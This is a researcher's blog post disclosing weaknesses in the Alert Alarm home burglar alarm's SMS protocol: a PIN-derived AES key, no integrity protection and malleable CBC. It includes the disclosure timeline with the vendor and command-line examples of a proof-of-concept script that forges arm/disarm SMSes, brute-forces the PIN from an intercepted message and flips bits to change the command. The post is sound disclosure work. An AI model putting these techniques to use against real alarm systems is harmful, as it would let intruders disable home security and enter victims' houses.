<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8" />
        <title>Alert Alarm SMS exploit - English version</title>
        <link rel="stylesheet" href="https://jyx.github.io/theme/css/main.css" />
        <link href="https://jyx.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="joakimbech.com Atom Feed" />

        <!--[if IE]>
            <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="https://jyx.github.io/">joakimbech.com </a></h1>
                <nav><ul>
    
                        <li><a href="https://jyx.github.io/pages/about.html">About</a></li>
    
                        <li><a href="https://jyx.github.io/pages/projects.html">Projects</a></li>
                </ul>
                </nav>
<div id="submenu">
                    <ul>
                            <li><a href="https://jyx.github.io/category/coding.html">Coding</a></li>
                            <li><a href="https://jyx.github.io/category/git.html">Git</a></li>
                            <li class="active"><a href="https://jyx.github.io/category/hacking.html">Hacking</a></li>
                            <li><a href="https://jyx.github.io/category/tools.html">Tools</a></li>
                            <li><a href="https://jyx.github.io/category/woodworking.html">Woodworking</a></li>
                    </ul>
                <div>
        </header><!-- /#banner -->
<section id="content" class="body">
  <article>
    <header>
      <h1 class="entry-title">
        <a href="https://jyx.github.io/alert-alarm-exploit.html" rel="bookmark"
           title="Permalink to Alert Alarm SMS exploit - English version">Alert Alarm SMS exploit - English version</a></h1>
    </header>

    <div class="entry-content">
<footer class="post-info">
        <span>Thu 02 January 2020</span>
        	<span>| by <a class="url fn" href="https://jyx.github.io/author/joakim-bech.html">Joakim Bech</a></span>
	        <span>| in <a href="https://jyx.github.io/category/hacking.html">Hacking</a></span>
Translations:
        <a href="https://jyx.github.io/alert-alarm-exploit-se.html">se</a>

</footer><!-- /.post-info -->      <p>For Swedish translation of the article please go <a class="reference external" href="alert-alarm-exploit-se.html">here</a>.</p>
<div class="section" id="tl-dr">
<h2>tl;dr;</h2>
<p>For less tech savvy people or people just bored about all the details, this
tl;dr; and the <a class="reference internal" href="#summary">summary</a> section at the end should be enough to read to get an
understanding of the issues.</p>
<ul>
<li><p class="first">As of today, 2020-01-01, the issues presented here still haven't been fixed
even though initial report date was July 3rd 2019.</p>
</li>
<li><p class="first"><a class="reference external" href="https://www.alertalarm.se">Alert Alarm</a> is a Swedish company selling burglar alarms (with various
possibilities for extensions) to home owners. At one of their pages [<a class="reference external" href="https://www.alertalarm.se/hemlarm/garanti-och-funktion.html#1">1</a>],
they are saying that: &quot;Our burglar alarms for home owners communicate using
an encrypted channel primarily using GSM and secondarily using SMS&quot;.
Apparently there is also some collaboration with <a class="reference external" href="https://www.verisure.se/">Verisure</a> since the people
that I've been in contact with after reporting the issue to Alert Alarm are
coming from Verisure.</p>
<ul>
<li><p class="first"><strong>Added 2020-01-03</strong>: An update and clarification regarding Verisure's role
in this, since some people have misunderstood and misinterpreted some of the
information in this article. Also, people working at Verisure have told me
that the two burglar alarms solutions, i.e., Alert Alarms and Verisure's
solution have nothing in common. Note however that these statements are
<strong>not</strong> coming directly from Verisure, but instead for people who claim that
their working for Verisure.</p>
<p>So, what have this to do with Verisure otherwise? To start with Alert Alarm
is a subsidiary to Verisure (see <a class="reference external" href="https://www.merinfo.se/foretag/Alert-Alarm-AB-5566748975/2k2aqzz-hp1t/styrelse-koncern">merinfo.se</a>). After my report last summer
I've <strong>only</strong> been in contact with Verisure people (people where their email
address ends with &#64;verisure.com). If it is Verisure employees or Alert Alarm
employees that have been working with mitigations I cannot tell, likewise I
cannot say anything about the differences and similarities between their
different solutions. But what I definitely know is that I've only been in
contact with people from Verisure.</p>
<p>But, to repeat and clarify, <strong>this report is only about Alert Alarms burglar
alarm and have nothing to do with Verisures burglar alarm</strong>. If (and when)
Alert Alarm and/or Verisure want to add information, confirm or make other
clarifications I'm going to update this article accordingly. My goal is to
give facts and not distort or give wrong and misleading information. In
other words, please reach out to my if you find information in this article
not accurate so I can fix it by using your references and comments. Note
however that neither Alert Alarm nor Verisure to this date have denied that
the information in this report is wrong and what can be read here is more or
less the same as sent to them in July last year.</p>
</li>
</ul>
</li>
<li><p class="first">It all started out one morning in June 2019 when I noticed that when turning
of the alarm from the App, a SMS was generated where the content was a long
(hex-)string with random characters. After doing some reverse engineering I
found out that Alert Alarm have multiple weaknesses in their SMS
implementation that are used when turning on/off alarms from their Alert Alarm
app (tested on Android). The weaknesses can be summarised in:</p>
<ul class="simple">
<li>Crypto algorithm in use is plain AES-CBC which is <a class="reference external" href="https://en.wikipedia.org/wiki/Malleability_(cryptography)">malleable</a>.</li>
<li>No integrity protection of the encrypted messages.</li>
<li>Heavily reduced key space, from 128-bits to 9999 keys.</li>
<li>Doesn't use any device unique values/properties in the data being sent to
the Alert Alarm server.</li>
<li>No key derivation function in use (KDF).</li>
<li>No key exchange protocol in use (like Diffie Hellman for example).</li>
</ul>
</li>
<li><p class="first">This makes the security of the implementation very fragile, since all it
takes for a rouge user is to get hold of a <strong>single</strong> SMS generated by the
Alert Alarm app to be able to gain access to someones house. I.e., when the
attacker got that he can easily figure out the code used to turn on/off the
burglar alarm. Using free services one can send <a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;oq=send+spoofed+sms">spoofed SMS</a> with manually
crafted data and then it's just to enter the victims house and no alarm will
go off. Alternatively a thief can break into the house and just simply enter
the code to turn off the alarm as the homeowner would do.</p>
</li>
<li><p class="first">On this page, one can find examples and a script that can decrypt Alert Alarm
SMSes and also create valid Alert Alarm SMSes. The script is also capable of
finding a key using a brute force attack and it's also possible to flip bits
to change the original intention of the SMS.</p>
</li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="observation">
<h2>Observation</h2>
<p>As mentioned, this caught my attention when I noticed that when turning off an
active alarm (<tt class="docutils literal">ARMED_HOME</tt>) using the Android app, a SMS is created similar to
this (had to blur parts of it, otherwise anyone could figure out my own code by
just running the scripts presented here).</p>
<div class="align-center figure">
<img alt="SMS image" src="/images/alert/aa_initial_sms.png" />
</div>
<p>After spending the rest of the morning reverse engineering the app I could see
that the 64 bytes hex string is made up of two parts. The first part is the IV,
which is a random number (coming from <tt class="docutils literal">SHA1PRNG</tt>) and the second part is the
actual message.</p>
<div class="highlight"><pre><span></span>   32 bytes   32 bytes
+-----------+----------+
| IV        | Message  |
+-----------+----------+
</pre></div>
<p>It uses a 128-bit key, however the key used for encryption are made up of
strings like this:</p>
<div class="highlight"><pre><span></span>000000000000xxxx
</pre></div>
<p>Where &quot;xxxx&quot; is the pin code that is used to turn on and off the burglar alarm.
This means the key space is heavily reduced from 128-bits, to only 9999
combinations instead of 340282366920938463463374607431768211455 combinations as
it would have been if they had used a proper key!</p>
<p>The message it self is encrypted using plain <a class="reference external" href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_(CBC)">AES-CBC</a>, so no integrity
protection or anything. What that means is that although the SMS is encrypted
anyone can still modify it without the receiver noticing that. I'll talk more
about that further down in the examples about flipping bits (see the section:
&quot;Flip a bit in the encrypted message&quot;).</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<div class="section" id="message-format">
<h3>Message format</h3>
<p>The format of the decrypted message is as follows:</p>
<div class="highlight"><pre><span></span>Bytes:            1   1   1      2       1     2        2        2         2          2   = 16 bytes
        +-----------+---+---+------+---------+-----+------+--------+---------+----------+
        |SMS Version| i | j | year | month-1 | day | hour | minute | user id | \x00\x00 |
        +-----------+---+---+------+---------+-----+------+--------+---------+----------+
                                      (hex)
</pre></div>
<p>Here &quot;<tt class="docutils literal">i</tt>&quot; seems to represent the &quot;<cite>alarm off (0)</cite>&quot; and &quot;<cite>alarm on (1)</cite>&quot; and
&quot;<tt class="docutils literal">j</tt>&quot; is probably whether it is &quot;<cite>armed home</cite>&quot; or &quot;<cite>armed away</cite>&quot;.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
</div>
<div class="section" id="script">
<h2>Script</h2>
<p>On my GitHub page, you'll find a Python script (<a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py">aaxploit.py</a>) that I wrote as
a proof of concept script. With that script you can generate valid Alert Alarm
SMSes, brute force SMS to get the code to the burglar alarm and a couple of other
things that I'll go more into detail separately below. Calling the script with
no arguments lists all possible parameters. But to make it easier to follow
along, we've put together a couple of examples below.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<div class="section" id="generate-a-sms-from-scratch">
<h3>Generate a SMS from scratch</h3>
<p>This creates a valid SMS message (hex string), i.e, a real usable string that
can be sent as an SMS and that will either turn on or turn off the alarm. &quot;-p&quot;
here is the code that you want to use. If you own an Alert Alarm system, then
you can try this, put your own and known code after &quot;-p&quot; and use either &quot;--on&quot;
or &quot;--off&quot; to arm or disarm the alarm. Then take the crafted SMS and send it as
an SMS to the alarm unit to attack.</p>
<p><strong>Added 2020-01-05</strong>: After getting feedback from other Alert Alert users, we
can conclude that there is no central SMS number, instead it seems like it's
main unit itself that receives the SMS directly.</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py -e -p <span class="m">1234</span>
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              <span class="m">32303131393630333038343830310000</span>
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d244e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              <span class="m">30303030303030303030303031323334</span> <span class="o">(</span><span class="m">0000000000001234</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: encryption
<span class="o">[</span>INFO<span class="o">]</span>: Crafted SMS:      d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
</pre></div>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="decrypt-a-sms-from-the-phone">
<span id="decrypt-sms"></span><h3>Decrypt a SMS from the phone</h3>
<p>As an example, take the crafted SMS from the example above (having that said,
copy a SMS string from a phone, generated by the Alert Alarm app works just as
well). In this example we already know the pin code to turn on/off the alarm,
so we provide that as a parameter.</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p <span class="m">1234</span>
<span class="o">[</span>INFO<span class="o">]</span>: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d244e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              <span class="m">30303030303030303030303031323334</span> <span class="o">(</span><span class="m">0000000000001234</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: decryption
<span class="o">[</span>INFO<span class="o">]</span>: <span class="p">|</span> sms_v <span class="p">|</span> i <span class="p">|</span> j <span class="p">|</span> year <span class="p">|</span> month <span class="p">|</span> day <span class="p">|</span> hour <span class="p">|</span> minute <span class="p">|</span> user_id <span class="p">|</span>
<span class="o">[</span>INFO<span class="o">]</span>:       <span class="m">2</span>   <span class="m">0</span>   <span class="m">1</span>     <span class="m">19</span>     0x6    <span class="m">03</span>     <span class="m">08</span>       <span class="m">48</span>        <span class="m">01</span>
</pre></div>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="brute-force-an-encrypted-sms">
<h3>Brute force an encrypted SMS</h3>
<p>Here we pretend that we <strong>don't</strong> know the key (i.e., the pin code to turn
on/off the alarm), but we somehow have gotten hold of the encrypted SMS. By
running the brute force attack we try to find the correct key and pin to turn
on/off the alarm. Due to the nature of how the message is encoded, this always
seems to work and since the key space is very small, it finds the key/pin in
less than a second.</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -b
<span class="o">[</span>INFO<span class="o">]</span>: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d244e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              None <span class="o">(</span><span class="m">0000000000000000</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: bruteforce
<span class="o">[</span>INFO<span class="o">]</span>: <span class="o">(</span>Probably<span class="o">)</span> found the correct ...
<span class="o">[</span>INFO<span class="o">]</span>:    encryption key: <span class="m">30303030303030303030303031323334</span>
<span class="o">[</span>INFO<span class="o">]</span>:    pin:            <span class="m">1234</span>
</pre></div>
<p>As we can see, we found the correct key/pin code! Note that the pin code is the
same as used on the real physical burglar alarm at the alarm owners house. I.e.,
if a thief breaks in, he can enter this pin code and the alarm never goes off.</p>
<div class="line-block" id="flip-bits">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="flip-a-bit-in-the-encrypted-message">
<h3>Flip a bit in the encrypted message</h3>
<p>Since AES-CBC is <a class="reference external" href="https://en.wikipedia.org/wiki/Malleability_(cryptography)">malleable</a>, we can flip a bit in the IV which will be directly
reflected on the decrypted message. I.e., a man in the middle can use this to
either change a message from &quot;Turn on alarm&quot; to a &quot;Turn off alarm&quot; or vice
versa. Notice that here one doesn't even have to decrypt the message, i.e, by
just taking the original message and flip a bit and use the modified SMS is
enough to turn off (or turn on) the alarm. In the example below we flip the
meaning of the &quot;<tt class="docutils literal">i</tt>&quot; bit.</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b --flip <span class="m">112</span>
<span class="o">[</span>INFO<span class="o">]</span>: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d244e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              None <span class="o">(</span><span class="m">0000000000000000</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: flip bits
<span class="o">[</span>INFO<span class="o">]</span>: Modified IV:      d245e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Modified SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
</pre></div>
<p>If we take the &quot;Modified SMS&quot; and decrypt it, we can see that the &quot;i&quot; field has
been changed (from &quot;0&quot; to &quot;1&quot;, compare with message above, see the section
&quot;Decrypt a SMS from the phone&quot;).</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py --input d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p <span class="m">1234</span>
<span class="o">[</span>INFO<span class="o">]</span>: Original SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d245e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              <span class="m">30303030303030303030303031323334</span> <span class="o">(</span><span class="m">0000000000001234</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: decryption
<span class="o">[</span>INFO<span class="o">]</span>: <span class="p">|</span> sms_v <span class="p">|</span> i <span class="p">|</span> j <span class="p">|</span> year <span class="p">|</span> month <span class="p">|</span> day <span class="p">|</span> hour <span class="p">|</span> minute <span class="p">|</span> user_id <span class="p">|</span>
<span class="o">[</span>INFO<span class="o">]</span>:       <span class="m">2</span>   <span class="m">1</span>   <span class="m">1</span>     <span class="m">19</span>     0x6    <span class="m">03</span>     <span class="m">08</span>       <span class="m">48</span>        <span class="m">01</span>
                  /<span class="se">\</span>
                  <span class="p">|</span>----- changed from <span class="m">0</span> to <span class="m">1</span>
</pre></div>
<p>Note that bit-flipping can be done to anything in the data, i.e., it would
probably work to trick the system by taking an old valid SMS created by the
Alert Alarm app and then just flip the date and/or hour bits and resend the
modified SMS.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
</div>
<div class="section" id="other-attacks">
<h2>Other attacks?</h2>
<ul class="simple">
<li>Is the Alert Alarm solution susceptible to <a class="reference external" href="https://en.wikipedia.org/wiki/Replay_attack">replay attacks</a>? Is is possible
to send the same message more than once?<ul>
<li>No it's not, sending the same SMS twice makes the main control unit say
&quot;Fjärrkontroll, felkod 2&quot;. Also by adding for example +1 to minute still
doesn't work. So, probably Alert Alarm on the server side are checking
either a hash of all messages coming in and/or simply just check that the
data in the SMS isn't too old.</li>
</ul>
</li>
<li>Will the Alert Alarm server detect brute force attacks. I.e., can one send
9999 SMS in a short amount of time and thereby gain access to someones house?<ul>
<li>I haven't got this confirmed, but it's certainly something one easily could
try.</li>
<li><strong>Added 2020-01-05</strong>: Since other Alert Alarm users have helped confirming
that it's not a single number for SMSes going to a common server, this
attack in practice becomes infeasible, since it'd require too many SMSes to
be able to practically make an attack. However, don't mix up this brute
force attack with the brute force attack on the SMS (two different attacks).</li>
</ul>
</li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="open-questions">
<h2>Open questions</h2>
<p>Why did Alert Alarm decide to use SMS from the app, when there already must be a
data connection with the app? This means that it probably works something like
this.</p>
<ul class="simple">
<li>The SMS is sent to the server.</li>
<li>The server decrypts the SMS, checks the parameters, record the action
and send out a request (using the data connection over GSM) to the home
owners main unit controlling the alarm.</li>
<li>When the alarm has been armed/disarmed, the Android app gets a
notification of the updated status.</li>
<li><strong>Added 2020-01-05</strong>: Since other Alert Alarm users have helped confirming
that there is no single SMS service, the reasoning above cannot be correct.
It's probably instead SMS -&gt; Main unit -&gt; Change status -&gt; Inform Alert Alarm
server -&gt; Notification in the app. But, it's impossible to tell whether this
is how it really works, I can just speculate on my own, Alert Alarm would need
to confirm.</li>
</ul>
<p>Why on earth use SMS at all? Doesn't all mobile phone / users have a data
connection in 2019?</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="questions-and-statements-on-forums-etc">
<h2>Questions and statements on forums etc</h2>
<p><strong>Added 2020-01-05</strong>: After going public with this people have started asking
questions directly to me and in forums etc, I will try to give my view and
answers to some of it here.</p>
<ul class="simple">
<li>Q: SMS is actually a feature, since there are areas without data coverage.<ul>
<li>A: I agree on that part. Living in a country where data coverage is very
good I maybe was too quick on that. However, if the company offer such a
service/feature then they must carefully architect the solution in a way
that it is secure and that man in the middle cannot make any sense out of
the data that is sent between the app and the one receiving the SMS.</li>
</ul>
</li>
<li>Q: Will the one making a brute force SMS attack get any notification when the
correct number has been found?<ul>
<li>A: No, it's just a regular SMS sent out, so in an attack one would send all
messages needed to cover the entire key space (9999 keys). However as stated
in other places in this article after the 2020-01-05 update, this brute
force attack will be practically infeasible since you'd need to brute force
the SMS phone number also.</li>
</ul>
</li>
<li>Q: A burglar alarm isn't at the end of the day that useful, at best it'll
put some stress on the thieves and maybe the thieves goes to the neighbors
with no burglar alarm instead of trying to get into your house.<ul>
<li>A: I think I mostly agree on that. If police and/or a guard would have shown
up within minutes after the alarm goes of, then it'd be really useful. But I
think most people with me knows that it can take quite a bit of time until
someone actually shows up. However today alarms have many other features
that can be useful to home owners, fire alarm, leaking water etc.</li>
</ul>
</li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<!-- summary_: -->
</div>
<div class="section" id="contact-with-alert-alarm-verisure">
<h2>Contact with Alert Alarm / Verisure</h2>
<ul class="simple">
<li><strong>July 3rd 2019</strong>: I'm reporting to the support page that I want to disclose a
security issue.</li>
<li><strong>July 9th 2019</strong>: Using a private Facebook message to Alert Alarm I once
again try to say that I have a security issue that I want to report.</li>
<li><strong>July 10th 2019</strong>:<ul>
<li>Alert Alarm responds at Facebook that they've sent my contact details to the
people developing the app.</li>
<li>Verisure's Information Security Manager try to contact me using first phone
and then email.</li>
<li>I send over the report (basically this blog post) together with proof of
concept scripts.</li>
</ul>
</li>
<li><strong>Augusti 12th 2019</strong>: Phone meeting with Verisure, I get a status update and
Verisure mentions that they need more time than standard 90-day disclosure
time, something that I'm fine with.</li>
<li><strong>October 2nd 2019</strong>: I reach out to Verisure asking for an update. Message is that
they are still working on a solution, testing &quot;something&quot; that should work and
that they soon will let me know more about it. I also ask about CVE number and
when we can go public with this. No answer to that.</li>
<li><strong>November 4th 2019</strong>: I reach out once again asking for an update.</li>
<li><strong>November 7th 2019</strong>: Verisure replies with more or less the same message as
October 2nd. Again promises to get back to me soon.</li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="page-updates">
<h2>Page updates</h2>
<ul class="simple">
<li><strong>1:st January 2020</strong>: I'm cleaning up the write-up and publish all this. The
reason for doing it today is because today it's half a year ago since I
initially reported the issues to Alert Alarm. If they would have been serious
about this, it should all have been fixed by now and they should have
reconnected better with me.</li>
<li><strong>3:rd January 2020</strong>: Updating the article with clarification regarding Alert
Alarm's vs Verisure's role in this.</li>
<li><strong>5:th January 2020</strong>: Updating the article with additional information
regarding the SMS attack and a new section about questions that have been
asked on forums etc.</li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="summary">
<h2>Summary</h2>
<p>The security of the solution relies on</p>
<ol class="arabic simple">
<li>the pin code and</li>
<li>the SMS senders phone number and</li>
<li>that no-one is able to get hold of the SMS sent.</li>
</ol>
<p>In fact, one can argue that <strong>the security only relies on &quot;3&quot;</strong>, since if one
gets hold of &quot;3&quot;, then it's trivial to figure out &quot;1&quot;, that is basically what
the script <a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py">aaxploit.py</a> does. &quot;2&quot; on the other hand is typically available
in phone books etc, i.e., it's usually not hard to figure out the phone numbers
to the owner of a house.</p>
<p>Alert Alarm seems to have tried to &quot;lock&quot; the SMS service to a set of users.
i.e., the first user have to add additional phone numbers before these people
can use the app. So at first glance, one might believe that it's only the
owners of these phone numbers who can send the SMS. But the fact is that there
are many services out there that allow you to send <a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;oq=send+spoofed+sms">spoofed SMS</a> so it looks
like they were sent from a certain phone number. I.e., it's totally possible to
craft a SMS using <a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py">aaxploit.py</a> and then use one of these services to send a
rouge SMS. I.e., any user can turn off the alarm without the alarm owner knowing
about it.</p>
<p><strong>Should the owners of this alarm be worried?</strong> Getting an SMS from the home
owner is probably a bit challenging, so it's probably a bit hard to actually do
the attack (don't leave your phone unattended!). On the other hand if Alert
Alarm <strong>doesn't</strong> notice brute force attacks on the receiving side of the SMS,
then it's fairly easy to put this attack into practice.</p>
<ul class="simple">
<li><strong>Added 2020-01-05</strong>: Since other Alert Alarm users have helped confirming
that it's not a single and common SMS number that receives the alarm SMSes,
the brute force attack where one needs to send multiple SMSes isn't
practically doable, since it'd require too many SMSes to be sent out. So my
conclusion is that Alert Alarm owners doesn't have to worry about that
particular attack, it's simply too complicated to put the attack in practice.
However, it should not be mixed with the brute force attack on the SMS to get
the pin code. That still works as described. I.e., a man in the middle can
figure out a home owners code to turn on/off the alarm. What we would like to
see is that the protocol is designed in such a way that the man in middle gets
<strong>no</strong> useful information out for the data sent between the phone and the
receiver of the data/SMS.</li>
</ul>
<p>No matter, the flaws identified are quite severe and gives an attacker several
ways to attack the system. Attacks that shouldn't be possible to do that easy on
a system meant to protect our homes. Me and the other customers of Alert Alarm
don't want our burglar alarms to have these kind of weaknesses. Right now it's
more <a class="reference external" href="https://en.wikipedia.org/wiki/Security_through_obscurity">Security by Obscurity</a> than real security.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="about-me">
<h2>About me</h2>
<p>I'm Joakim Bech, a guy who has been working with Security on embedded devices
for the last 12 years. I did the work above on my spare time, but otherwise I
head the security team at a company called <a class="reference external" href="https://www.linaro.org/">Linaro</a> where I've been working for
a little bit more than 6 years.</p>
</div>

    </div><!-- /.entry-content -->

  </article>
</section>
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>blogroll</h2>
                        <ul>
                            <li><a href="http://getpelican.com">Pelican</a></li>
                            <li><a href="https://linaro.org">Linaro</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>
                            <li><a href="https://jyx.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>

                            <li><a href="https://www.linkedin.com/in/jbech">linkedin</a></li>
                            <li><a href="https://github.com/jbech-linaro">github</a></li>
                            <li><a href="https://twitter.com/Jyxxan">twitter</a></li>
                            <li><a href="https://www.facebook.com/Jyxxan">facebook</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <p>Powered by <a href="http://getpelican.com/">Pelican</a>. Theme <a href="https://github.com/blueicefield/pelican-blueidea/">blueidea</a>, inspired by the default theme.</p>
        </footer><!-- /#contentinfo -->

</body>
</html>